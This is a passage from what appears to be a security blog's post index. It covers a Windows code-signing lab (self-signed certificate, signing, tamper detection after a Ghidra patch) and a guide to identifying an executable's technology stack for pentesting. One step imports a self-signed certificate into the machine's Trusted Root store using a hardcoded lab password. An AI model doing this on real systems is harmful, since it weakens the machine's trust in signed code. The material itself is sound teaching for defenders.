\"Cert:\\CurrentUser\\My\" ` -NotAfter (Get-Date).AddYears(1) # Export to PFX file $password = ConvertTo-SecureString -String \"LabPassword123\" -Force -AsPlainText Export-PfxCertificate ` -Cert $cert ` -FilePath \"C:\\path\\to\\codesign.pfx\" ` -Password $password Step 4: Sign the Application Use signtool (included in Windows SDK): signtool sign /f codesign.pfx /p LabPassword123 /fd SHA256 HelloWorld.exe Using Windows Properties: Right-click the signed executable → Properties → Digital Signatures tab Signed application - Digital Signatures tab shows certificate details Using sigcheck: PS &gt; sigcheck .\\HelloWorld.exe Sigcheck v2.90 - File version and signature viewer Copyright (C) 2004-2022 Mark Russinovich Sysinternals - www.sysinternals.com C:\\path\\to\\HelloWorld.exe: Verified: A certificate chain processed, but terminated in a root certificate which is not trusted by the trust provider. Link date: 07:56 04/01/2026 Publisher: Lab Code Signing Certificate Company: n/a Description: n/a Product: n/a Prod version: n/a File version: n/a MachineType: 64-bit The application is signed but shows a warning because the certificate isn’t trusted. This is expected for self-signed certificates. Step 5: Trust the Certificate (Testing Only) To simulate a trusted signature, import the certificate to the Trusted Root store: # Run as Administrator PS &gt; Import-PfxCertificate ` -FilePath \"C:\\path\\to\\codesign.pfx\" ` -CertStoreLocation Cert:\\LocalMachine\\Root ` -Password (ConvertTo-SecureString -String \"LabPassword123\" -AsPlainText -Force) PSParentPath: Microsoft.PowerShell.Security\\Certificate::LocalMachine\\Root Thumbprint Subject ---------- ------- 37EC816665AC772A6375F6DD87AA2ED4B84093C5 CN=Lab Code Signing Certificate Verify again: PS &gt; sigcheck .\\HelloWorld.exe Sigcheck v2.90 - File version and signature viewer Copyright (C) 2004-2022 Mark Russinovich Sysinternals - www.sysinternals.com C:\\path\\to\\HelloWorld.exe: Verified: Signed Signing date: 08:08 04/01/2026 Publisher: Lab Code Signing Certificate Company: n/a Description: n/a Product: n/a Prod version: n/a File version: n/a MachineType: 64-bit Now the signature is Verified: Signed. Step 6: Test Tampering Detection Let’s modify the signed binary to demonstrate signature validation: Open HelloWorld.exe in Ghidra Locate the “Hello World!” string Change it to “HACKED!!!!!!” Export as HelloWorld-patched.exe Original “Hello World!” string Patched to “HACKED!!!!!!” Run and verify the patched binary: PS &gt; .\\HelloWorld-patched.exe HACKED!!!!!! PS &gt; sigcheck .\\HelloWorld-patched.exe Sigcheck v2.90 - File version and signature viewer Copyright (C) 2004-2022 Mark Russinovich Sysinternals - www.sysinternals.com C:\\path\\to\\HelloWorld-patched.exe: Verified: The digital signature of the object did not verify. Signing date: 09:38 04/01/2026 Publisher: Lab Code Signing Certificate Company: n/a Description: n/a Product: n/a Prod version: n/a File version: n/a MachineType: 64-bit Result: The digital signature of the object did not verify. Even a small modification invalidates the signature, preventing undetected tampering. Conclusion Code signing protects applications from tampering by verifying authenticity and integrity. During security assessments, unsigned applications or those with self-signed certificates in production should be reported as findings. Always verify signatures when pentesting Windows applications to identify potential security gaps." }, { "title": "Identifying Technology Stack in Windows Applications", "url": "/posts/identify-tech-stack-in-windows-app/", "categories": "Windows App Security, WinApp Techniques", "tags": "enumeration, technology-detection, pe-analysis, windows", "date": "2026-01-02 17:04:00 +0700", "content": "Introduction The first step in pentesting a Windows application is understanding what technology it’s built with. This determines our entire testing approach. This article covers essential techniques for identifying the technology stack of Windows executables. Why Technology Detection Matters Different technologies have different attack surfaces. For example: .NET applications → Easy to decompile with dnSpy Native C/C++ → Memory corruption vulnerabilities like buffer overflows Electron apps → Node.js vulnerabilities and XSS in webviews Delphi/VB → Require specific decompilers, often have legacy vulnerabilities Packed/Protected → Must be unpacked before analysis Knowing the technology helps us choose the right testing approach and exploitation techniques. Detection Tools Detect It Easy (DiE) DiE is the tool I usually use first when analyzing Windows executables. It’s open-source and available on GitHub. How to use: Download and extract DiE from the releases page Run die.exe Open the executable you want to analyze (File → Open or drag and drop) DiE will automatically show the detection results As an example, let’s analyze Notepad from C:\\Windows\\notepad.exe: Compiler: Microsoft Visual C/C++(19.36.33145)[LTCG/C] Linker: Microsoft Linker(14.36.33145) Language: C++ Tool: Visual Studio(2022, v17.6) From the results, we can see that Notepad is a native C++ application compiled with Visual Studio 2022. Additional samples to try: If you want to practice identifying different technologies, here are some executables you can download: Technology Application Description Go Hugo Static compiled Go binary Delphi/Pascal Cheat Engine Delphi GUI application Electron VS Code Electron-based editor with JavaScript/TypeScript .NET dnSpy .NET Framework application Packed (UPX) UPX Self-packed executable Rust Alacritty Terminal emulator written in Rust Alternative Tools CFF Explorer - PE structure analysis tool, closed-source, last updated 2012 (ntcore.com) PEiD - Classic packer/compiler detector (no longer maintained) strings - Extract readable strings from binaries (Sysinternals) Conclusion Identifying the technology stack is essential before pentesting any Windows application. Different technologies require different approaches. Know the technology, choose the right tools, find the vulnerabilities." } ]
